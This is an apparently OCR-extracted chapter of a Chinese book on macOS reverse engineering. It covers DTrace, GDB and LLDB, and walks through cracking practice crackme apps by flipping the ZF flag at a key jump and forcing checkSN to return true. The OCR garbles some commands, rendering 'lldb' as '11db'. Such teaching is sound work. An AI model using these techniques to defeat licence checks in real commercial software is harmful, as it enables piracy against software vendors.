因为D语言不支持循环，如果没有聚合函数，该统计是很难实现的。从这个示例也可以看出来count()函数的使用方法，其中要注意的是exec_times前面的@符号不可省略。

#### 7.2.7 内置函数与变量

在之前的示例中，已经用过printf()函数和execname变量了，DTrace还有许多内置函数和变量。DTrace中常用的内置函数如表7-2所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>函数声明</td><td style='text-align: center; word-wrap: break-word;'>描述</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>void printf(string format, ...)</td><td style='text-align: center; word-wrap: break-word;'>格式化输出，与C语言中的printf函数用法类似</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>void trace(expression)</td><td style='text-align: center; word-wrap: break-word;'>将给定的参数输出显示，与printf不同的是trace不支持格式化输出</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>void tracemem(address, size_t nbytes)</td><td style='text-align: center; word-wrap: break-word;'>输出指定地址的内存</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>void ustack(int nframes)</td><td style='text-align: center; word-wrap: break-word;'>输出目标程序触发探测器时的栈，只输出用户态的栈，nframes指定输出的数量</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>void ustack(void)</td><td style='text-align: center; word-wrap: break-word;'>同上，输出的数量为默认数量</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>void *copyin(uintptr_t addr, size_t size)</td><td style='text-align: center; word-wrap: break-word;'>将指定地址的内存复制到一个临时的缓冲区中，在打印函数的参数时经常使用，一般配合tracemem使用</td></tr></table>

(续)

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>函数声明</td><td style='text-align: center; word-wrap: break-word;'>描述</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>string copyinstr(uintptr_t addr)</td><td style='text-align: center; word-wrap: break-word;'>将指定地址的内存的C格式字符串转换为D语言的字符串，常用于函数的参数</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>void exit(int status)</td><td style='text-align: center; word-wrap: break-word;'>停止跟踪并退出DTrace，status为退出代码</td></tr></table>

常用内置变量如表7-3所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>变量名称与类型</td><td style='text-align: center; word-wrap: break-word;'>描述</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>string execname</td><td style='text-align: center; word-wrap: break-word;'>触发该探测器的程序名</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>int64_t arg0, ..., arg9</td><td style='text-align: center; word-wrap: break-word;'>探测器的前10个参数，类型均为int64_t</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>pid_t pid</td><td style='text-align: center; word-wrap: break-word;'>触发该探测器的进程ID</td></tr></table>

关于获取触发器的参数值，下面用一个示例演示一下：

#!/usr/sbin/dtrace -s

syscall::open:entry
{
    trace(argo);
    tracemem(copyin(argo, 10), 10);
    trace(copyinstr(argo));
}

运行这段脚本，将会把触发器的第一个参数依次当作一个int64_t、一段内存和字符串打印出来，结果如下：

CPU ID FUNCTION:NAME
0 151 open:entry 140459869360128
0 1 2 3 4 5 6 7 8 9 a b c d e f 0123456789abcdef
0: 2f 55 73 65 72 73 2f 78 69 6e /Users/xin
/Users/macbook
0 151 open:entry 140645624838656
0 1 2 3 4 5 6 7 8 9 a b c d e f 0123456789abcdef
0: 2f 55 73 65 72 73 2f 78 69 6e /Users/xin
/Users/macbook
0 151 open:entry 123145302830368
0 1 2 3 4 5 6 7 8 9 a b c d e f 0123456789abcdef
0: 2f 55 73 65 72 73 2f 78 69 6e /Users/xin
/Users/macbook/Qt5.7.0//Contents/PkgInfo
0 151 open:entry 123145302830368
0 1 2 3 4 5 6 7 8 9 a b c d e f 0123456789abcdef
0: 2f 55 73 65 72 73 2f 78 69 6e /Users/xin
/Users/macbook/Qt5.7.0//Contents/PkgInfo
0 151 open:entry 123145302830848
0 1 2 3 4 5 6 7 8 9 a b c d e f 0123456789abcdef
0: 2f 55 73 65 72 73 2f 78 69 6e /Users/xin
/Users/macbook/Qt5.7.0//Contents/PkgInfo

由于DTrace的许多探测器都缺少文档，很多时候只能靠猜测来推断某个探测器的参数。在实际编写D脚本时，把探测器的 $ \arg_{0} $到 $ \arg_{9} $在终端中打印出来，也许会有意想不到的效果。

### 7.3 调试器

调试器（Debugger）是一种用于调试其他应用程序的工具。调试器的目的是为了控制和查看被调试程序的运行状态，以便于查找和排除软件中的Bug。

一个完善的调试器一般都具有以下6项功能。

☐ 查看被调试程序的反汇编代码

☐ 断点与跟踪功能

☐ 单步执行功能

☐ 查看被调试程序的变量、寄存器等状态

☐ 线程调试

☐ 栈帧回溯

调试器具有强大的跟踪和控制能力，因此，它在逆向工程中毫无疑问地成为了最重要的工具之一，甚至产生了许多专为逆向工程设计的调试器，比如在Win32平台上大名鼎鼎的OllyDBG。由于逆向工程都缺少目标程序的源代码，这些逆向用的调试器大多数是汇编级的调试器，接下来将为大家介绍在macOS系统上经常用到的调试器。

#### 7.3.1 GDB

GDB（GNU Debugger）是GNU工具链中提供的一款调试器，可以称得上是现存调试器中的元老，功能十分强大，支持的平台和语言数量众多。GDB也支持macOS和iOS系统，在LLDB没有出现之前，GDB一直是苹果系统上的官方调试器，现在在苹果系统上也仍然可用。

虽然GDB主要是用作源代码级调试和除错，但是由于它也支持反汇编，并且调试功能强大，所以在逆向工程中也会经常用到。GDB运行效果如图7-1所示。

 </div>

GDB默认没有安装进系统，需要从第三方渠道进行安装。可以选择GNU官网下载源代码扣自己编译，也可以使用HomeBrew快速安装。安装命令如下：

##### $ brew install gdb

安装完调试器之后，就可以启动GDB进行调试了。但还是会有问题，macOS系统中的调试器必须经过苹果颁发的证书签名，HomeBrew安装的GDB是没有签名的，可以通过以下命令查看：

   </div>

如果直接使用它来调试程序，会输出如下错误信息:

$ gdb -p 508
GNU gdb (GDB) 7.12
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/GPLv3+>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law. Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-apple-Darwin15.6.0".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>
For help, type "help".
Type "apropos word" to search for commands related to "word".
Attaching to process 508
Unable to find Mach task port for process-id 508: (os/kern) failure (0x5).
(please check gdb is codesigned - see taskgated(8))
(gdb)

解决方法是使用有效的证书对GDB进行签名，签名完成后才能正常使用。当然，还有一种方法是执行GDB命令时，加上sudo，强制GDB在root权限下运行。本节将不会对GDB命令进行深入讲解，macOS上的GDB被认为是一个过时的产品，在macOS上功能远远没有LLDB强大，稳定性也不如后者，但为了照顾到依旧愿意使用GDB的“守旧派”，在下一节讲LLDB调试时，会列出LLDB对应的GDB命令。

#### 7.3.2 LLDB

LLDB是来自LLVM工具链中的一款调试器，也是目前苹果官方主推的调试器。LLDB的功能与它的前辈GDB非常相似，得益于良好的设计，LLDB解决了GDB中许多让人头疼的问题。LLDB使用C++开发，模块划分清晰，并且有良好的接口，比GDB的MI（Machine Interface）模式更便于与IDE等前端的整合，也更为稳定。

不过由于LLDB兴起时间较短，所以在跨平台以及多语言的支持上目前都不如GDB。如果只是在苹果的系统上使用，那么首选的调试器自然非LLDB莫属了。LLDB运行效果如图7-2所示。

LLDB作为苹果官方首推的调试器, 在macOS以及iOS上的稳定性和强大的功能都是其他调试器所无法比拟的。LLDB在逆向工程中也有着广泛的应用, 特别是在没有IDA、Hopper或者遇到问题不方便使用它们的时候, LLDB不失为一款优良的替代品。

 $  \odot  $

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td colspan="2">2. Idb Hello (Idb)</td></tr></table>

 </div>

接下来将演示如何使用LLDB来调试和破解cm02程序，在调试过程中也会提供LLDB命令对应的GDB命令。关于LLDB的详细命令以及对应的GBD命令在LLDB官网上有一份列表 $ ^{①} $，这份列表并不全面，读者可以在启动LLDB后使用help命令查看支持的命令，想要详细了解的读者可以参考。

如果读者安装了新版的Xcode，LLDB调试器就会默认安装。将shell切换到cm02所在的目录，通过命令11db cm02.app启动LLDB并加载目标程序，执行成功后LLDB会输出如下信息并等待用

   </div>

户的输入：

(11db) target create "cm02.app"
Current executable set to 'cm02.app' (x86_64).
(11db)

加载成功后可通过r命令来运行可执行程序。接下来的破解思路与在IDA中的破解思路基本上是一致的。不过由于LLDB并没有像IDA那样强大的静态分析功能，无法通过交叉引用查找什么地方使用了NSAlert。但是在LLDB中，可以对Objective-C的消息下断点，并在中断后通过调用堆栈来查找什么地方调用了这个消息。

首先,根据注册失败时显示的一个模态的提示框,可以判断cm02是使用了[NSAlert runModal]消息来显示这个对话框,所以需要先对这个消息下断点,然后输入错误的注册码进行注册以触发该断点。在指定消息上下断点可以使用以下命令:

$ breakpoint set --name "-[NSAlert runModal]"
或简写为：

$ b - [NSAlert runModal]

相应的GDB命令为：

$ break - [NSAlert runModal]

要注意此处的消息名，如果消息有一个参数，则需要在消息末尾加上一个冒号“;”；如果有多个参数，则需要把所有参数的别名一起带上。比如，如果要对NSAlert的setMessageText消息下断点，需要写成b-[NSAlert setMessageText:]。

因为目标程序正在运行，如果要进入输入状态，就需要先在LLDB所在的终端界面按Ctrl+C来中断程序的执行。中断后，输入b-[NSAlert runModal]并回车，如果执行成功的话，LLDB会输出如下提示（此处地址在不同情况下会有所不同）：

Breakpoint 1: where = AppKit`-[NSAlert runModal], address = 0x00007fff9a3858ab

输入 “c” 并回车，让cm02程序继续运行，然后随意输入一个注册码并点击注册，就会发现程序在调试器中中断，并显示了断点处的信息和反汇编，如下所示：

Process 41045 stopped
* thread #1: tid = 0x197a31, 0x00007fff9a3858ab AppKit`-[NSAlert runModal], queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x00007fff9a3858ab AppKit`-[NSAlert runModal]
AppKit`-[NSAlert runModal]:
-> 0x7fff9a3858ab <+0>: pushq %rbp
0x7fff9a3858ac <+1>: movq %rsp, %rbp
0x7fff9a3858af <+4>: pushq %r15
0x7fff9a3858b1 <+6>: pushq %r14

不过，此处反汇编实际上是对NSAlert runModal消息处理的函数的反汇编，没有必要去研究NSAlert的实现，需要将重点放在哪里调用了该消息。可以通过查看调用堆栈信息来找到是哪个函数调用了-[NSAlert runModal]。查看调用堆栈的命令如下：

$ thread backtrace

或简写为：

$ bt

相应的GDB命令也是bt。该命令还有一些参数控制查看调用堆栈的深度或者查看所有线程的调用堆栈，默认情况下是查看当前线程的调用堆栈。LLDB显示当前线程的调用堆栈为：

com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00007fff9a3858ab AppKit`-[NSAlert runModal]
frame #1: 0x000000010000381a cm02`specialized ViewController.onCheckBtnClicked(AnyObject) -> ()
    [inlined] function signature specialization <Arg[0] = Owned To Guaranteed and Exploded,
    Arg[1] = Owned To Guaranteed and Exploded, Arg[2] = Dead> of cm02.ViewController.showDialog
    (info : Swift.String, text : Swift.String) -> () + 650 at ViewController.swift:43 [opt]
frame #2: 0x000000010000380b cm02`specialized ViewController.onCheckBtnClicked(AnyObject) -> ()
    [inlined] cm02.ViewController.showDialog (info : Swift.String, text : Swift.String) -> () at ViewController.swift:37 [opt]
frame #3: 0x000000010000380b cm02`specialized
    ViewController.onCheckBtnClicked(self=<unavailable>) -> () + 635 at ViewController.swift:48 [opt]
frame #4: 0x0000000100002602 cm02`@objc ViewController.onCheckBtnClicked(AnyObject) -> () [inlined]
    cm02.ViewController.onCheckBtnClicked (Swift.AnyObject) -> () + 34 at ViewController.swift:0 [opt]
frame #5: 0x00000001000025fa cm02`@objc ViewController.onCheckBtnClicked(AnyObject) -> () + 26 at ViewController.swift:0 [opt]
frame #6: 0x00007fffb172fc41 libsystem_trace.dylib`_os_activity_initiate + 61
    frame #7: 0x00007fff9a7d0d8e AppKit`-[NSApplication(NSResponder) sendAction:to:from:] + 456
frame #8: 0x00007fff9a31b5c4 AppKit`-[NSControl sendAction:to:] + 86
frame #9: 0x00007fff9a31b4ec AppKit`_26-[NSCell_sendActionFrom:]_block_invoke + 136
frame #10: 0x00007fffb172fc41 libsystem_trace.dylib`_os_activity_initiate + 61
frame #11: 0x00007fff9a31b444 AppKit`-[NSCell_sendActionFrom:] + 128
frame #12: 0x00007fff9a35dd6c AppKit`-[NSButtonCell_sendActionFrom:] + 98
frame #13: 0x00007fffb172fc41 libsystem_trace.dylib`_os_activity_initiate + 61
frame #14: 0x00007fff9a319d2b AppKit`-[NSCell_trackMouse:inRect:ofView:untilMouseUp:] + 2481
frame #15: 0x00007fff9a35daa6 AppKit`-[NSButtonCell_trackMouse:inRect:ofView:untilMouseUp:] + 798
frame #16: 0x00007fff9a3186e3 AppKit`-[NSControl mouseDown:] + 832
frame #17: 0x00007fff9a9316f3 AppKit`-[NSWindow(NSEventRouting)
    handleMouseDownEvent:isDelayedEvent:] + 6341
frame #18: 0x00007fff9a92df10 AppKit`-[NSWindow(NSEventRouting) _reallySendEvent:isDelayedEvent:]
    + 1942
frame #19: 0x00007fff9a92d3ae AppKit`-[NSWindow(NSEventRouting) sendEvent:] + 541
frame #20: 0x00007fff9a7cd4cd AppKit`-[NSApplication(NSEvent) sendEvent:] + 1145
frame #21: 0x00007fff9a0ae589 AppKit`-[NSApplication run] + 1002
frame #22: 0x00007fff9a0791ad AppKit`NSApplicationMain + 1237
frame #23: 0x0000000100002ab9 cm02`main + 73 at AppDelegate.swift:12 [opt]
frame #24: 0x00007fffb14fd255 libdyld.dylib`start + 1

其中frame #0就是当前所在的-[NSAlert runModal]函数处，而frame #1和frame #2可以理解为是在specialized ViewController.onCheckBtnClicked函数中，但是由于cm02.ViewController.showDialog函数被内联到了onCheckBtnClicked函数里面，所以才会产生这两个栈帧。对于ViewController.onCheckBtnClicked函数，通过名字可以比较容易地判断出，它应该是点击验证按钮时执行的函数。执行如下命令对该函数进行反汇编：

$ disassemble --name 'ViewController.onCheckBtnClicked'
或者简写为：
$ di -n 'ViewController.onCheckBtnClicked'
GDB命令为：
$ disassemble 'ViewController.onCheckBtnClicked'

执行完以后, LLDB就会显示该函数的反汇编代码, 不过在默认情况下, LLDB使用的是AT&T格式的反汇编。如果读者不喜欢AT&T格式的反汇编代码, 可以执行以下命令让调试器显示Intel格式的反汇编代码:

$ settings set target.x86-disassembly-flavor intel

如果觉得每次都设置比较麻烦，可以将这条命令写入到~/.ldbinit文件中，这样在每次打开 LLDB 的时候都会自动将反汇编格式设置为Intel语法。

在GDB中可以执行set disassembly-flavor intel命令将反汇编格式设置为Intel格式。

设置完成后重新执行反汇编命令，LLDB会输出如下反汇编代码：

cm02`@objc ViewController.onCheckBtnClicked(AnyObject) -> ():
0x1000025e0 <+0>: push rbp
0x1000025e1 <+1>: mov rbp, rsp
0x1000025e4 <+4>: push r14
0x1000025e6 <+6>: push rbx
0x1000025e7 <+7>: mov r14, rdx
0x1000025ea <+10>: mov rbx, rdi
0x1000025ed <+13>: call 0x100003a72 ; symbol stub for: objc_retain
0x1000025f2 <+18>: mov rdi, r14
0x1000025f5 <+21>: call 0x100003afo ; symbol stub for: swift_unknownRetain
0x1000025fa <+26>: mov rdi, rbx
0x1000025fd <+29>: call 0x100003590 ; function signature specialization <Arg[0] = Dead> of cm02.ViewController.onCheckBtnClicked (Swift.AnyObject) -> () at ViewController.swift
0x100002602 <+34>: mov rdi, rbx
0x100002605 <+37>: call 0x100003a6c ; symbol stub for: objc_release
0x10000260a <+42>: mov rdi, r14
0x10000260d <+45>: pop rbx
0x10000260e <+46>: pop r14
0x100002610 <+48>: pop rbp
0x100002611 <+49>: jmp 0x100003aea ; symbol stub for: swift_unknownRelease
cm02`@objc ViewController.onCheckBtnClicked(AnyObject) -> ():
0x1000025fa <+26>: mov rdi, rbx
0x1000025fd <+29>: call 0x100003590 ; function signature specialization <Arg[0] = Dead> of cm02.ViewController.onCheckBtnClicked (Swift.AnyObject) -> () at ViewController.swift
cm02`specialized ViewController.onCheckBtnClicked(AnyObject) -> ():
0x1000035e8 <+88>: call 0x100003b2c ; symbol stub for: static (extension in Foundation):Swift.String._unconditionallyBridgeFromObjectiveC (Swift.Optional<_ObjC.NSString>) -> Swift.String
0x1000035ed <+93>: mov qword ptr [rbp - 0x38], rax

0x1000035f1 <+97>: mov qword ptr [rbp - 0x40], rdx
0x1000035f5 <+101>: mov qword ptr [rbp - 0x48], rcx
0x1000035f9 <+105>: add r15, qword ptr [rip + 0x2b20]
0x100003600 <+112>: mov rdi, r15
0x100003603 <+115>: call 0x100003b08 ; symbol stub for: swift_unknownWeakLoadStrong
0x100003608 <+120>: mov r13, rax
0x10000360b <+123>: test r13, r13
0x10000360e <+126>: je 0x100003832 ; <+674> at ViewController.swift:47
0x100003614 <+132>: mov rbx, qword ptr [rip + 0x2915] ; "stringValue"
0x10000361b <+139>: mov rdi, r13
0x10000361e <+142>: call 0x100003a72 ; symbol stub for: objc_retain
0x100003623 <+147>: mov rdi, r13
0x100003626 <+150>: mov rsi, rbx
0x100003629 <+153>: call 0x100003a60 ; symbol stub for: objc_msgSend
0x10000362e <+158>: mov rdi, rax
0x100003631 <+161>: call 0x100003a78 ; symbol stub for: objc_retainAutoreleasedReturnValue
0x100003636 <+166>: mov rdi, rax
0x100003639 <+169>: call 0x100003b2c ; symbol stub for: static (extension in Foundation):Swift.String._unconditionallyBridgeFromObjectiveC (Swift.Optional<_ObjC.NSString>) -> Swift.String
0x10000363e <+174>: mov r12, rax
0x100003641 <+177>: mov r14, rdx
0x100003644 <+180>: mov r15, rcx
0x100003647 <+183>: call 0x100003b20 ; symbol stub for: (extension in Foundation):Swift.String.Encoding.utf8.unsafePutableAddressor : (extension in Foundation):Swift.String.Encoding
0x10000364c <+188>: mov rbx, qword ptr [rax]
0x10000364f <+191>: call 0x100003b26 ; symbol stub for: (extension in Foundation):Swift.String.(data (using : (extension in Foundation):Swift.String.Encoding, allowLossyConversion : Swift.Bool) -> Swift.Optional<Foundation.Data>).(default argument 1)
0x100003654 <+196>: movzx esi, al
0x100003657 <+199>: mov rdi, rbx
0x10000365a <+202>: mov rdx, r12
0x10000365d <+205>: mov rcx, r14
0x100003660 <+208>: mov r8, r15
0x100003663 <+211>: call 0x100003b14 ; symbol stub for: (extension in Foundation):Swift.String.data (using : (extension in Foundation):Swift.String.Encoding, allowLossyConversion : Swift.Bool) -> Swift.Optional<Foundation.Data>
0x100003668 <+216>: mov r12, rax
0x10000366b <+219>: mov rdi, r15
0x10000366e <+222>: call 0x100003aea ; symbol stub for: swift_unknownRelease
0x100003673 <+227>: test r12, r12
0x100003676 <+230>: je 0x100003834 ; <+676> at ViewController.swift
0x10000367c <+236>: mov edi, 0x2
0x100003681 <+241>: mov rsi, r12
0x100003684 <+244>: call 0x100003b1a ; symbol stub for: Foundation.Data.base64EncodedString (options : _ObjC.NSData.Base64EncodingOptions) -> Swift.String

可以看到LLDB添加了很多注释，这些注释对逆向工作有着极大的帮助。由于有多个重名的 ViewController.onCheckBtnClicked，因此会有多段反汇编，不过可以通过调用堆栈的 frame #1 的地址0x000000010000381a找到想要的部分。

查看0x10000381a地址上面部分的代码，可以看到0x10000380b到0x100003815处的代码正是在使用objc_msgSend函数向NSAlert发送runModal消息，这说明离关键代码已经十分接近了。顺藤摸瓜，继续往上看，可以看到在0x1000036db和0x1000036eb处使用allocWithZone实例化了一个NSAlert，然后调用init进行初始化（0x1000036f0-0x1000036fa），紧接着的两句代码比较关键，代码如下：

0x100003702 <+370>: test r14b, 0x1
0x100003706 <+374>: je 0x10000374d ; <+445> [inlined] function signature specialization
<Arg[0] = Owned To Guaranteed and Exploded, Arg[1] = Owned To Guaranteed and Exploded,
Arg[2] = Dead> of cm02.ViewController.showDialog (info : Swift.String, text : Swift.String) -> () at
ViewController.swift:37

跳转和不跳转的情况都调用了setMessageText()来设置NSAlert显示的内容，设置完成后都会到达同样的代码位置（0x100003790），来设置NSAlert的其他信息并进行显示。虽然在前面的调试中，我们已经知道了此处就是关键跳转，相信读者即使前面没有分析过这个cm02，也应该能判断出此处就是关键跳。

接下来，就该修改跳转来使错误的注册码也能注册成功。不过比较可惜的是，LLDB不支持通过汇编的方式修改可执行文件，只能直接修改内存。配合前面的Interactive Assembler工具进行修改则稍显麻烦，并且不能保存到文件。建议大家只是用LLDB进行调试跟踪，如果要进行修改的话，可以使用IDA Pro或者Hopper，或者使用其他十六进制编辑器。

如果要验证分析是否正确，可以在0x100003706处的je上下断点。由于je是在rflags寄存器的ZF标志位为1的情况下进行跳转，因此可以在到断点后修改ZF标志位，来使其跳转到注册成功的代码上。在LLDB中读取和设置寄存器的命令为：

$ register read <寄存器名>
$ register write <寄存器名> <值>
可以简写为：
re r 寄存器名
re w 寄存器名 值
显示所有寄存器的值：
$ register read --all
$ re r -a
GDB打印寄存器值的命令为：
$ info registers 寄存器名
$ p $寄存器名 = 值

接下来，首先执行b 0x100003706在这条跳转指令上下一个断点，然后输入 “c” 让目标程序继续执行。任意输入一个注册码并点击注册，就会发现程序已经断在这条指令上了，然后输入指令re r rflags，得到rflags的值为0x000000000000000246。我们知道，ZF为rflags中的第6位，使用计算器查看第6位是1，将其改为0并设置回去，阻止这个je指令进行跳转。

将ZF位置为0后得到的值是0x206，执行re w rflags 0x206进行设置，然后输入“c”继续运行，遇到了在NSAlert runModal上的断点。回车后继续运行，就可以看到注册成功的对话框了。

除了上面介绍的命令外，LLDB还支持很多其他高级的功能，其中就包含Objective-C运行时函数调用、打印程序控件布局、Python脚本命令增强等。以上一章的crackme为例，使用LLDB加载运行并按ctrl+C中断程序后，可以执行下面的操作：

(11db) po [NSApplication sharedApplication]
<NSApplication: 0x100606b00>

(11db) po NSApplication.sharedApplication
<NSApplication: 0x100606b00>

(11db) po [[NSApplication sharedApplication] delegate]
<crackme.AppDelegate: 0x10062e3b0>

(11db) po [[NSApplication sharedApplication] windows]
<_NSArrayM 0x10066c3d0>(
<NSWindow: 0x1010089f0>
)

(11db) po [0x1010089f0 contentView]
<NSView: 0x10061c440>

(11db) po [[0x1010089f0 contentView] subviews]
<_NSArrayM 0x10062c790>(
<NSTextField: 0x10061d170>,
<NSTextField: 0x100628440>,
<NSButton: 0x100628cd0>,
<NSButton: 0x10062a680>,
<NSTextField: 0x10062ad60>,
<NSTextField: 0x10062bac0>,
<NSButton: 0x10062c0e0>

每个运行的程序都有一个NSApplication对象，可以调用NSApplication的sharedApplication()获取这个对象的实例。NSApplication有一个delegate属性，返回当前程序的AppDelegate代理对象，该对象提供了程序的一些代理方法的实现，找到它后，可以对它的方法下断来分析一些功能，例如按钮响应事件。NSApplication的windows属性返回当前程序的所有窗口，每个窗口使用NSWindow类表示，获取到窗口对象后，就可以通过它的contentView属性获取NSView对象，进而获取它所有的子视图对象。

LLDB调用框架方法，还可以这么玩：

(11db) po [[NSBundle mainBundle] bundleURL]
file://Users/macbook/Documents/macbook/crackme.app/
(11db) po [[NSBundle mainBundle] executableURL]
file://Users/macbook/Documents/macbook/crackme.app/Contents/MacOS/crackme
(11db) po [[NSBundle mainBundle] bundlePath]

/Users/macbook/Documents/macbook/crackme.app
(11db) po [[NSBundle mainBundle] executablePath]
/Users/macbook/Documents/macbook/crackme.app/Contents/MacOS/crackme
(11db) po [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleVersion"]
1
(11db) po [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleIdentifier"]
fc.crackme

po命令调用的这些类与方法都是苹果开发SDK中的框架提供的，读者在使用LLDB调用与下断这些方法时，可以参考苹果官方的开发文档了解更多的方法与属性，获得更好的调试体验。

LLDB支持使用Python脚本来强化调试功能，这让本就功能强大的LLDB如虎添翼。使用Python语言编写的脚本，在LLDB交互状态下可以执行command script import spt_name.py加载进来，但更加普遍的做法是新建~/ldbinit文件，然后将命令写入这个配置文件中。LLDB在启动时执行文件中的命令，自动加载这些命令。

在网上公开的LLDB命令插件脚本中，最出名的是Facebook开发的Chisel $ ^{(1)} $。这是一个脚本命令集，用于iOS软件的调试，部分命令支持macOS软件。安装Chisel可以到GitHub上下载代码后自动配置，但更简单的方法是使用HomeBrew安装，只需要一行命令即可：

$ brew install chisel

安装完成后在~/ldbinit文件中添加一行内容，下次启动LLDB时就会自动加载Chisel中的命令集：

command script import /usr/local/opt/chisel/libexec/fblldb.py

以上面打印程序页面的控件布局为例，使用po命令需要完整地执行如下命令：

(lldb) po [[[[NSApplication sharedApplication] windows] firstObject] contentView] subviews]
<NSArrayM 0x10184f3a0>(
<NSButton: 0x1018419d0>,
<NSButton: 0x101842a90>,
<NSPopUpButton: 0x1018462c0>,
<NSBox: 0x101848420>,
<NSLevelIndicator: 0x10183a700>,
<NSColorWell: 0x101846e00>,
<NSTextField: 0x10184a9a0>,
<NSSecureTextField: 0x10184ac00>,
<NSButton: 0x10184ede0>
)

输出的信息中只包含了对象的类型与内存地址。而这个功能在Chisel中有替代命令：pviews，它输出的内容更加丰富，如下所示：

(11db) pviews
[ A ] h=-&- v=-&- NSView 0x10231bef0 f=(0,0,365,112) b=(-) TIME drawRect: min/mean/max

[ AF ] h---& v=&-- NSTextField 0x10231cc70 "user name:" f=(37,85,72,17) b=(-) TIME drawRect: min/mean/max 0.62/0.62/0.62 ms
[ AF ] h---& v=&-- NSTextField 0x10071b350 "serial number:" f=(37,47,91,17) b=(-) TIME drawRect: min/mean/max 0.17/0.17/0.17 ms
[ AF ] h---& v=&-- NSButton 0x10071bbb0 "Register" f=(255,3,90,32) b=(-) TIME drawRect: min/mean/max 1.10/1.10/1.10 ms
[ AF ] h---& v=&-- NSButton 0x10071d7e0 "Clean" f=(179,3,75,32) b=(-) TIME drawRect: min/mean/max 0.41/0.41/0.41 ms
[ AF ] h---& v=&-- NSTextField 0x10071dee0 "aaaaa" f=(146,82,199,22) b=(-) TIME drawRect: min/mean/max 0.33/0.56/0.76 ms
[ D AF ] h---& v=&-- NSTextField 0x10071ec00 "1111-2222-3333-4444" f=(146,44,199,22) b=(-) TIME drawRect: min/mean/max 0.12/0.24/0.44 ms
[ D AF P ] h---- v---- NSKeyboardFocusClipView 0x10073eb60 f=(2,3,195,17) b=(2,3,-,-) TIME drawRect: min/mean/max 0.02/0.05/0.12 ms
[ D AF ] h---- v---- NSTextView 0x102601c70 f=(2,3,195,17) b=(-) TIME drawRect: min/mean/max 0.00/0.00/0.00 ms
[ AF ] h---& v=&-- NSButton 0x10071f220 "?" f=(140,3,34,32) b=(-) TIME drawRect: min/mean/max 0.62/0.62/0.62 ms
A=autoresizesSubviews, C=canDrawConcurrently, D=needsDisplay, F=flipped, G=gstate, H=hidden (h=by ancestor), L=needsLayout (l=child needsLayout), U=needsUpdateConstraints (u=child needsUpdateConstraints), O=opaque, P=preservesContentDuringLiveResize, S=scaled/rotated, W=wantsLayer (w=ancestor wantsLayer), V=needsVibrancy (v=allowsVibrancy), #=has surface

但Chisel提供的命令也是有限的，很多在调试过程中实用的功能都没有，比如以下功能。

☐ 代码偏移下断功能。在IDA中分析的代码地址，是无法直接在LLDB中不断的，需要根据ASLR偏移计算出正确的内存地址后才能下断。

☐ 消息跟踪。给LLDB添加一个跟踪指定objc_sendMsg()方法的功能。

☐ 修改保存功能。给LLDB加上一个将修改保存到文件中的功能。

以上这些功能，读者可以自己尝试实现一下。

最后，不得不说的是LLDB的条件断点功能，它功能强大，而且非常实用。还是拿crackme程序来说，判断checkSN()是否为注册关键函数时，可以使用LLDB在调试时下条件断点直接测试，方法如下：

(11db) b checkSN

Breakpoint 1: where = crackme`crackme.AppDelegate.checkSN (Swift.String, sn : Swift.String) ->
Swift.Bool, address = 0x000000010bd36160

(11db) break command add 1

Enter your debugger command(s). Type 'DONE' to end.

> thread return YES

> continue

> DONE

(11db) continue

Process 8413 resuming

(11db) thread return YES

(11db) continue

Process 8413 resuming

Command #2 'continue' continued the target.

* thread #1: tid = 0x45b38f, 0x000000010bd357e7 crackme`crackme.AppDelegate.onReg (Swift.AnyObject

-> ( ) + 3799, queue = 'com.apple.main-thread'
frame #0: 0x000000010bd357e7 crackme crackme.AppDelegate.onReg (Swift.AnyObject) -> ( ) + 3799
crackme crackme.AppDelegate.onReg (Swift.AnyObject) -> ( ):
-> 0x10bd357e7 <+3799>: test al, 0x1
0x10bd357e9 <+3801>: je 0x10bd35c7f ; <+4975>
0x10bd357ef <+3807>: jmp 0x10bd357f1 ; <+3809>
0x10bd357f1 <+3809>: mov rax, qword ptr [rip + 0x48e8] ; (void *)0x000000010c009ec0: swift_isaMask

使用break command add可以为断点添加需要执行的命令，thread return YES表示让线程返回true，接着是continue继续执行，DONE表示命令输入完毕。命令输入完成后，执行continue让程序继续跑起来。接下来输入错误的用户名与序列号，点击Register按钮都会提示成功，如图7-3所示。

 </div>

#### 7.3.3 IDA Pro

在第6章中,相信大家已经领略到了IDA强大的静态分析能力了,不过IDA的强大并不止于此。在早期的版本中,IDA的调试功能一直都很弱,虽然在最新的IDA中,调试功能仍不是十分完善,但是已经可以满足大多数逆向工作的需要了。IDA调试程序的效果如图7-4所示。

 </div>

新版本的IDA还有一项极其强大的功能，那就是可以在反编译出的伪C代码上进行调试，可以进行单步或者下断点。比起面对反汇编代码的汪洋大海，这种调试方式显然更利于理解目标程序。效果如图7-5所示。

 </div>

